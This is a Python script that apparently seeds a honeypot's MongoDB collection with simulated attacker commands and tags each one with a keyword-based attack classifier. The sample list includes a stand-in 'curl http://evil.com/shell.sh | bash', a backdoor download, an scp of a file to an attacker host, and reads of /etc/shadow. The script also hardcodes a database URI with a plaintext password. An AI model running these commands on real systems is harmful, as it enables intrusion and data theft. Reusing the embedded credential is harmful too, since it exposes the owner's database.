from datetime import datetime
from pymongo import MongoClient
import os
import random

MONGO_URI = "mongodb+srv://kalaiboaz_db_user:XUV3rthRmubjnuHG@honeypot.nyvgpyd.mongodb.net/"
DB_NAME = "honeypot"
COLLECTION_NAME = "commands"

SESSION_ID = os.getenv("SESSION_ID", "simulated-session")

ATTACK_PATTERNS = {
    "su": "Privilege Escalation",
    "sudo": "Privilege Escalation",
    "chmod": "Privilege Escalation Attempt",
    "chown": "Privilege Escalation Attempt",
    "id": "System Info",
    "whoami": "User Info",
    "uname": "System Info",
    "ls": "Files Lookup",
    "wget": "Suspicious Download",
    "curl": "Suspicious Download",
    "ssh": "Lateral Movement",
    "gcc": "Compilation Activity",
    "python": "Script Execution",
    "scp": "File Transfer",
    "cat /etc/shadow": "Unauthorized File Access",
    "find / -perm -4000": "SUID Enumeration",
    "getcap -r /": "Capabilities Enumeration",
}

SAMPLE_COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "ls -la /root",
    "cat /etc/shadow",
    "sudo su",
    "chmod 777 /etc/passwd",
    "find / -perm -4000 2>/dev/null",
    "getcap -r / 2>/dev/null",
    "wget http://malicious-site.com/backdoor.sh",
    "curl http://evil.com/shell.sh | bash",
    "ssh root@192.168.1.10",
    "scp file.txt attacker@10.0.0.5:/tmp/",
    "python exploit.py",
    "gcc backdoor.c -o backdoor"
]

client = MongoClient(MONGO_URI)
db = client[DB_NAME]
collection = db[COLLECTION_NAME]


def detect_attack_type(command):
    for pattern, attack_type in ATTACK_PATTERNS.items():
        if pattern in command:
            return attack_type
    return "Unknown"


def upload_simulated_commands():
    print("[*] uploading simulated commands...")

    for cmd in SAMPLE_COMMANDS:
        doc = {
            "session_id": SESSION_ID,
            "timestamp": datetime.utcnow(),
            "command": cmd,
            "attack_type": detect_attack_type(cmd),
            "raw_line": f"{datetime.utcnow().isoformat()} {cmd}"
        }

        collection.insert_one(doc)
        print(f"[+] inserted: {cmd}")

    print("[*] done.")


if __name__ == "__main__":
    upload_simulated_commands()
